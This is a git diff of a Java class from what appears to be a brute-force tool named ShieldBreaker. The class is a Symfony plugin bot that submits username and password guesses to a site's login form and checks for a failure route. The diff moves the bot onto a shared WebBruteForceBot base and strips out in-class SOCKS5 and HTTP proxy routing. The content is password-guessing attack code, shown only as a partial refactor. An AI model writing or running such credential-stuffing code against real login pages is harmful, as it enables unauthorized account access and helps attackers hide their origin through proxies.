@@ -1,13 +1,9 @@
 package com.shieldbreaker.symfonyplugin;
 
-import com.shieldbreaker.bot.Bot;
 import com.shieldbreaker.bot.BotManager;
+import com.shieldbreaker.webbruteforcecore.WebBruteForceBot;
 import com.shieldbreaker.kernel.ShieldBreaker;
 import com.shieldbreaker.symfonyplugin.exceptions.InvalidHTTPStatusCodeException;
-import com.shieldbreaker.symfonyplugin.customHttpClients.BaseCustomHttpClient;
-import com.shieldbreaker.symfonyplugin.customHttpClients.DefaultHttpClient;
-import com.shieldbreaker.symfonyplugin.customHttpClients.HttpHttpClient;
-import com.shieldbreaker.symfonyplugin.customHttpClients.Socks5HttpClient;
 import org.apache.http.HttpHost;
 import org.apache.http.NameValuePair;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
@@ -18,35 +14,16 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
-public class SymfonyBot extends Bot {
-    public SymfonyBot(BotManager manager, List<String> passwords) {
-        super(manager, passwords);
+public class SymfonyBot extends WebBruteForceBot {
+    public SymfonyBot(BotManager manager) {
+        super(manager);
     }
 
     @Override
     public void run() {
         try {
-            String domain = parametersManager.getDOMAIN();
-            String cookie = parametersManager.getCOOKIE();
-            String username = parametersManager.getACCOUNT();
             String trialRoute = parametersManager.getValue("trialRoute");
             String failureRoute = parametersManager.getValue("failureRoute");
-            String socksProxyAddress = parametersManager.getValue("socksProxy");
-            String httpProxyAddress = parametersManager.getValue("httpProxy");
-            String protocol = parametersManager.getValue("protocol");
-            String userAgent = parametersManager.getValue("userAgent");
-            int port = Integer.parseInt(parametersManager.getValue("port"));
-
-            //Setup custom httpClient
-            BaseCustomHttpClient httpClient;
-
-            if (!socksProxyAddress.isEmpty()) {             //SOCKS5 PROXY
-                httpClient = new Socks5HttpClient(socksProxyAddress);
-            } else if (!httpProxyAddress.isEmpty()) {       //HTTP PROXY
-                httpClient = new HttpHttpClient(httpProxyAddress);
-            } else {                                        //NO PROXY
-                httpClient = new DefaultHttpClient();
-            }
 
             //Setup target host
             HttpHost target = new HttpHost(domain, port, protocol);
@@ -77,7 +54,7 @@ public class SymfonyBot extends Bot {
 
                 nameValuePairs = new ArrayList<>();
                 nameValuePairs.add(new BasicNameValuePair("_username", username));
-                nameValuePairs.add(new BasicNameValuePair("_password", passwords.get(i)));
+                nameValuePairs.add(new BasicNameValuePair("_password", password));
 
                 try {
                     //Test credentials
